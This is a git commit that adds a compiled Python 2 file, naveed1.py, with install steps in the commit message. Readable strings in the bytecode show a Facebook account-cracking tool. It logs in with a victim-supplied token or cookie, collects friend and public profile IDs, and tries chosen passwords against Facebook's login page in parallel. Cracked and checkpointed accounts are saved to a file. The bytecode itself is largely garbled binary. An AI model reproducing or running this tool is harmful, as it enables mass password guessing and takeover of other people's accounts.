1768a306ffb775ad8a170f7ffa7daf04bbd7e0ae
mrnaveedoo <81456284+mrnaveedoo@users.noreply.github.com>
2021-03-29 09:03:51 +0500

    Rename naveed.py to naveed1.py
    apt update 
    apt upgrade 
    apt install python2 
    apt install git 
    pip2 install mechanize 
    pip2 install requests 
    git clone https://github.com/mrnaveedoo/naveedo
    cd naveedo1
    python2 naveed1.py

---
+++ naveed1.py
@@ -0,0 +1,263 @@
+�
+E^`c@s�ddlZddlZddlZddlZddlZddlZddlZddlZddlZddl	Z	ddl
+Z
+ddlZddlZddl
+mZddlmZy�ddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddl	Z	ddl
+Z
+ddlZddl
+mZWn_ek
+r�ejd�ejd�ejd�ejd�ejd�ejd�nXyejd	�WnnXee�ejd
+�dZdZd
+ZdZdZdZdZdZyddlZWnek
+r`ejd�nXyddlZWnek
+r�ejd�nXd�Z d�Z!d�Z"d�Z#dZ$d�Z%gZ&gZ'gZ(dZ)gZ*gZ+gZ,gZ-gZ.ga/gZ0ga1gZ2gZ3gZ4gZ5gZ6gZ7gZ*dZ8dZ9d�Z:d�Z;d�Z<d�Z=d �Z>d!�Z?d"�Z@d#�ZAd$�ZBd%�ZCd&�ZDd'�ZEd(�ZFd)�ZGd*�ZHeId+kr�ejd,�e:�ndS(-i����N(t
+ThreadPool(tConnectionErrorspip2 install requestsspip2 install mechanizespip2 install torspkg install torspython2 token100.pytsavetutf8s[1;91ms[1;92ms[1;93ms[1;94ms[1;95ms[1;96ms[1;97ms[0mcCsdGHtjj�dS(Ns[1;97m[!] Exit(tostsystexit(((s
+Khanjan.pytkeluar-scCsSd}d}x:|D]2}|d|tjdt|�d�|7}qWt|�S(NtmhkbpcPtt!ii(trandomtrandinttlentcetak(txtwtdti((s
+Khanjan.pytacak2s
+
+0cCs~d}xA|D]9}|j|�}|jd|dtd|��}q
+W|d7}|jdd�}tjj|d�dS(NRs!%ss[%s;1mis[0ms!0s
+(tindextreplacetstrRtstdtokettwrite(RRRtj((s
+Khanjan.pyR;s
+(
+cCsCx<|dD]0}tjj|�tjj�tjd�qWdS(Ns
+g�������?(RtstdoutRtflushttimetsleep(tzte((s
+Khanjan.pytjalanFs
+s>
+
+[1;97m  
+         ███╗   ██╗ █████╗ ██╗   ██╗███████╗███████╗██████╗  ██████╗ 
+████╗  ██║██╔══██╗██║   ██║██╔════╝██╔════╝██╔══██╗██╔═══██╗
+██╔██╗ ██║███████║██║   ██║█████╗  █████╗  ██║  ██║██║   ██║
+██║╚██╗██║██╔══██║╚██╗ ██╔╝██╔══╝  ██╔══╝  ██║  ██║██║   ██║
+██║ ╚████║██║  ██║ ╚████╔╝ ███████╗███████╗██████╔╝╚██████╔╝
+╚═╝  ╚═══╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚══════╝╚═════╝  ╚═════╝ 
+                                                                               
+ DONT COPY ME YOU DONT HAVE LEVEL TO COMPETE ME cCsFdddg}x0|D](}d|Gtjj�tjd�qWdS(Ns.   s..  s... s'
+[1;97m[+] [1;97mSedang Login [1;97mi(RRRRR(ttitikto((s
+Khanjan.pyttikOs
+
+
+is[31m   Not Vulns[32m   VulncCstjd�ytdd�}t�WnQttfk
+rztjd�tGHddGHdGHdGHdGHddGHt�nXdS(	Ntclears	login.txttri0t-s[1] Login Using Token Facebooks[2] Login Using Cookie Facebooks[0] Exit Aahil Tool(RtsystemtopentmenutKeyErrortIOErrortlogotpilih_masuk(ttoket((s
+Khanjan.pytmasukns
+
+		cCs�td�}|dkr'dGHt�nr|dks?|dkrIt�nP|dksa|dkrkt�n.|dks�|d	kr�t�ndGHt�dS(
+Ns
+[?] Select : R	s[!] Isi Yg Benar !t1t01t2t02t0t00(t	raw_inputR-ttokenztcookieR(tmsuk((s
+Khanjan.pyR-~s
+
+
+
+cCs)tjd�tGHddGHtd�}y�tjddi	dd6d	d
+6dd6d
+d6dd6dd6dd6dd6dd6di|d6�}tjd|j�}|dkr�dnd|j
+d�}Wntjjk
+r�dGHnXt
+d d!�}|j|j
+d��|j�td"�t�dS(#NR$i0R&s
+[?] Cookie : sGhttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_theaderss�Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36s
+user-agentshttps://m.facebook.com/treferersm.facebook.comthostshttps://m.facebook.comtoriginR0supgrade-insecure-requestss#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7saccept-languages	max-age=0s
+cache-controlsUtext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8tacceptstext/html; charset=utf-8scontent-typetcookiesR8s	(EAAA\w+)s&
+* Fail : maybe your cookie invalid !!s
+*   Your fb access token : is[!] No Connections	login.txtRs[1;92m[+] Login Hogaii[1;97m(RR'R,R6trequeststgettretsearchttexttNonetgroupt
+exceptionsRR(RtcloseR R)(R8tdatat
+find_tokenthasil((s
+Khanjan.pyR8�s0
+	)	
+
+cCs�tjd�ytdd�}t�Wn�ttfk
+r�tjd�tGHddGHtd�}y`tj	d|�}t
+j|j�}tdd�}|j
+|�|j�td	�t�Wq�tk
+r�d
+GHtjd�t�q�XnXdS(NR$s	login.txtR%i0R&s[?] Token :[1;97m s+https://graph.facebook.com/me?access_token=Rs%[1;92m[+] Login Hogaii[1;97m[1;97ms&[[1;97m![1;97m] [1;97mToken salah !g333333�?(RR'R(R)R*R+R,R6R@RAtjsontloadsRDRRHR RRR7(R.totwtatzedd((s
+Khanjan.pyR7�s*
+
+	
+
+
+
+
+cCs^tjd�ytdd�j�aWn7tk
+r_dGHtjd�tjd�t�nXy3tjdt�}t	j
+|j�}|d}Wnftk
+r�tjd�dGHtjd�t
+jd	�t�n#tjjk
+r�d
+GHt�nXtjd�tjd�tGHdd
+GHd|dGHdGHdGHdGHdGHdGHdd
+GHt�dS(NR$s	login.txtR%s[!] Token Invalid !srm -rf login.txts,https://graph.facebook.com/me/?access_token=tnames[!] [1;97mToken invalidis	[!] Erorrsgit pulli0R&s
+[1;97m[ Welcome [1;93ms	[1;97m ]s
+[1;97m[1] Start Crack s&[2] Search For Facebook Username & ID s[3] Join Aahils[4] Update toolss
+[0] Logout(RR'R(treadR.R+R/R@RARLRMRDR*RRRGRRR,t
+pilih_menu(RNROtnama((s
+Khanjan.pyR)�sB
+
+
+
+
+
+
+
+
+
+
+	
+	cCs�td�}|dkr'dGHt�n�|dks?|dkrIt�n�|dksa|dkrkt�n|dks�|d	kr�t�n]|d
+ks�|dkr�t�n;|dks�|d
+kr�tjd�t�ndGHt�dS(Ns[?] Menu : R	s[!] [1;97mIsi yang benarR0R1R2R3t3t03t4t04R4R5srm -rf login.txt(	R6RSt
+passchoicetuidtgruptupdatetoolsRR'R(tpeak((s
+Khanjan.pyRS�s"
+
+
+
+
+
+
+cCs>tjd�tGHddGHdGHdGHdGHddGHt�dS(NR$i0R&s[1] Crack From FriendLists[2] Crack From Public IDs[0] Back To Menu(RR'R,tpilih_passxd(((s
+Khanjan.pyRY�s
+		c
+std�}|dkr'dGHt�n.|dks?|dkr�tjd�tGHddGHtd	�tjd
+t�}t	j
+|j�}x�|dD]B}|d}|d
+}|jd�d}t
+j|d|�q�Wnx|dks�|dkr'tjd�tGHddGHtd�}y>tjd|dt�}t	j
+|j�}	d|	d
+GHWnItk
+r�dGHtd�t�n#tjjk
+r�dGHt�nXtjd|dt�}t	j
+|j�}x|dD]B}
+|
+d}|
+d
+}|jd�d}t
+j|d|�q�Wn.|dks?|dkrIt�ndGHt�td��td��td ��ddGHd!GHddGH���fd"�}td#�}|j|t
+�ddGHd$GHd%ttt��d&ttt��GHd'GHddGHtd(�t�dS()Ns
+[?] Select : R	s[!] [1;97mIsi yang benarR0R1R$i0R&s[+] Mengambil IDs3https://graph.facebook.com/me/friends?access_token=RItidRQt it|R2R3s[+] ID Public : shttps://graph.facebook.com/s?access_token=s[+] Name : s[!] ID Publik There Is No !s
+ [Back]s[!] Tidak ada koneksi !s/friends?access_token=R4R5s[!] Isi yang benars[?] Password 1 [1;97m:[1;97m s[?] Password 2 [1;97m:[1;97m s[?] Password 3 [1;97m:[1;97m s1  [41m   RUNNING CRACK FACEBOOK ACCOUNTS   [00mc
+s�|}|jd�\}}y~tjddi|d6�d6dd6did	d
+6�}|j}d|ksvd|kr�d
+|d�GHtdd�}|jd|d��|j�tj|��n�d|kr0d|d�GHtdd�}|jd|d��|j�t	j|��nhtjddi|d6�d6dd6did	d
+6�}|j}d|ks�d|kr�d
+|d�GHtdd�}|jd|d��|j�tj|��n�d|krBd|d�GHtdd�}|jd|d��|j�t	j|��nVtjddi|d6�d6dd6did	d
+6�}|j}d|ks�d|kr�d
+|d�GHtdd�}|jd|d��|j�tj|��n�d|krTd|d�GHtdd�}|jd|d��|j�t	j|��nD|j
+�d}tjddi|d6|d6dd6did	d
+6�}|j}d|ks�d|krd
+|d|GHtdd�}|jd|d|�|j�tj||�n�d|krvd|d|GHtdd�}|jd|d|�|j�t	j||�n"|j
+�d}	tjddi|d6|	d6dd6did	d
+6�}|j}d|ks�d|kr5d
+|d|	GHtdd�}|jd|d|	�|j�tj||	�ncd|kr�d|d|	GHtdd�}|jd|d|	�|j�t	j||	�nWnnXdS(NRas%https://mbasic.facebook.com/login.phpRItemailtpasstsubmittloginR:s�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]s
+user-agenttmbasic_logout_buttonssave-devices[1;92m[Succesfull] s ◊ s
+done/Indo.txtROs
+[Hack] t
+checkpoints[1;92m[Checkpoint] s	
+[Check] s[1;97m[Checkpoint] t123t12345(tsplitR@tposttcontentR(RRHtokstappendtcekpointtlower(
+targtuserRZRQtrextxotoketcektpass4tpass5(tpass1tpass2tpass3(s
+Khanjan.pytmain@s�7	
+
+7	
+
+7	
+
+7	
+
+7	
+
+is:
+[1;97m   [[1;97m✓[1;97m] Process Has Been Completed s/[+]  Total [1;97mOK[1;97m/[1;97mCP[1;97m : t/s4[+] Cracking Accounts Has Been Saved : done/Indo.txts
+ [Press Enter Go Back To Menu](R6R^RR'R,R R@RAR.RLRMRDtrsplitR_RnR*R)RGRRRYRtmapRR
+RmRo(
+R]R%RtsRZtnatnmtidttpoktspRR|tp((RyRzR{s
+Khanjan.pyR^	sv
+
+	
+
+
+
+	
+
+
+
+
+
+		S	)	
+cCs>tjd�tGHddGHdGHdGHdGHddGHt�dS(NR$i0R&s[1] Search ID Using Username  s[2] Search Username Using ID  s	[0] Back (RR'R,RC(((s
+Khanjan.pyRZ�s
+		cCs�td�}|dkr'dGHt�nf|dks?tdkrIt�nD|dksatdkrkt�n"|dkr�t�ndGHt�dS(	Ns[?] : R	s[!] Wrong InputR0R1R2R3R4(R6RZtidftusR)(tud((s
+Khanjan.pyRC�s
+
+
+
+cCs�y�td�}d|}tj|�j}tjd|�jd�jd�}tjd|�jd�}d|GHd|d	GHtd
+�t�WnItj	j
+k
+r�dGHt�n'tk
+r�dGHtd
+�t�nXdS(
+Ns
+Input Username Fb : shttps://www.facebook.com/sTitle">(.*?)</is
+| Facebooksprofile/(.*?)" s
+Nama : sId   : s
+s
+[Back]s[!] Koneksi bermasalahs[!] Username tidak di temukan(
+R6R@RARDRBRCRFtstripRZRGRRtAttributeError(tuturlR%RQR_((s
+Khanjan.pyR��s"
+$	
+
+
+
+
+cCs�y�td�}d|}tj|�j}tjd|�jd�jd�}tjd|�jd�}d|GHd|d	GHtd
+�t�WnItj	j
+k
+r�dGHt�n'tk
+r�dGHtd
+�t�nXdS(
+Ns
+Input ID Fb : shttps://www.facebook.com/sTitle">(.*?)</is
+| Facebooks"https://www.facebook.com/(.*?)" />s
+Nama     : sUsername : s
+s
+[Back]s[!] Koneksi bermasalahs[!] Id tidak di temukan(
+R6R@RARDRBRCRFR�RZRGRRR�(R�R�R%RQRr((s
+Khanjan.pyR��s"
+$	
+
+
+
+
+cCs>tjd�tGHddGHdGHdGHdGHddGHt�dS(NR$i0R&s!
+[1] ❤ Aahil Creations Page ❤s
+[2] Aahil ID s[0] Back(RR'R,t
+pilih_grup(((s
+Khanjan.pyR[�s
+		cCs�td�}|dkr'dGHt�n�|dkretjd�tGHddGHtjd�t�n`|d	kr�tjd�tGHddGHtjd
+�t�n"|dkr�t�ndGHt�dS(Ns[?] : R	s[!] Isi Yg BenarR0R$i0R&s2xdg-open https://www.facebook.com/103679511141844/R2s/xdg-open https://www.facebook.com/aahilrana4072R4(R6R�RR'R,R[R)(tgc((s
+Khanjan.pyR��s(
+
+	
+
+
+	
+
+
+cCs8tjd�tjd�tjd�tjd�dS(NR$spip2 install --upgrade sgit pull(RR'(((s
+Khanjan.pyR\s
+
+
+t__main__sgit pull(JRRRtdatetimeRthashlibRBt	threadingRLturllibt	cookielibR@tuuidtmultiprocessing.poolRtrequests.exceptionsRtgetpasstImportErrorR'tmkdirtreloadtsetdefaultencodingtmerahtlimetkuningtbirutungutbluetputihttutupt	mechanizeRRRR R,R#tidmemtidfriendtidfromfriendtbacktcekrektthreadstberhasiltemtemantemfromfriendRoRgRmR_t
+auto_totaltauto_oktauto_cptauto_runtlistgruptvulnottvulnR/R-R8R7R)RSRYR^RZRCR�R�R[R�R\t__name__(((s
+Khanjan.pyt<module>s���
+
+
+
+
+
+
+
+
+
+												'			�							
+
